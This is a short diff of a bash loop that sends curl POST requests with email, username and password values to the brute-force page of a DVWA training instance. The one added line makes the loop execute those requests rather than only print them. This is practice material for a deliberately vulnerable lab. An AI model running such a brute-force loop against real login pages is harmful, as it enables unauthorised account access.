@@ -15,5 +15,6 @@ do
   #echo #email
   command='curl -d "&email='$email'&username='$name'&password='$password'" -X POST https://www.choogyddad.com/DVWA/vulnerabilities/brute/'
   echo $command
+  $command
   i=$[$i+1]
 done
